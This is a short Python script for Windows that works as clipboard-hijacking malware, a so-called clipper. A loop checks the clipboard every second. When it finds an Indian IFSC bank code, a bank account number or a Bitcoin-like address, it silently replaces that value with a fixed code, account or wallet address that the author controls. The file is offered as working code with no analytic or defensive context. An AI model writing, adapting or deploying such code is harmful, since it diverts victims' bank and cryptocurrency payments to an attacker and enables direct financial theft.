import win32clipboard
import time
import re

IFSC_check = re.compile(r'([A-Za-z]){4}000(\d){4}')
acc_check = re.compile(r'(\d){11,16}')
btc_check = re.compile(r'([A-Za-z0-9]){26,35}')

def get_clipboard():
    win32clipboard.OpenClipboard()
    try:
        data = win32clipboard.GetClipboardData()
    except:
        win32clipboard.CloseClipboard()
        return False
    win32clipboard.CloseClipboard()
    ifsc = IFSC_check.sub(r'SBIN000XXXX', str(data))
    btc = btc_check.sub(r'1F1tAaz5x1HUXrCNLbtMDqcw6UNKNOWN', str(data.strip('  \n \r \t')))
    acc = acc_check.sub(r'38990284928700',str(data))
    
    #print(len(ifsc), len(btc), len(acc))
   # print(ifsc,btc,acc)
    if len(IFSC_check.findall(str(data))) != 0:
        swap_ifsc(data, ifsc)
    if len(btc_check.findall(str(data))) != 0:
        swap_ifsc(data, btc)
    if len(acc_check.findall(str(data))) != 0:
        swap_ifsc(data, acc)

    return True
   # print("data: ",data)
   
def swap_ifsc(data, ifsc):
    #print(len(data))
    win32clipboard.OpenClipboard()
    win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardText(ifsc)
    win32clipboard.CloseClipboard()

##def swap_btc(data, btc):
##    win32clipboard.OpenClipboard()
##    win32clipboard.EmptyClipboard()
##    win32clipboard.SetClipboardText(ifsc)
##    win32clipboard.CloseClipboard()
##
##def swap_acc(data, acc):
##    win32clipboard.OpenClipboard()
##    win32clipboard.EmptyClipboard()
##    win32clipboard.SetClipboardText(ifsc)
##    win32clipboard.CloseClipboard()
    
while True:
    if get_clipboard():
        time.sleep(1)
    else:
        time.sleep(1)



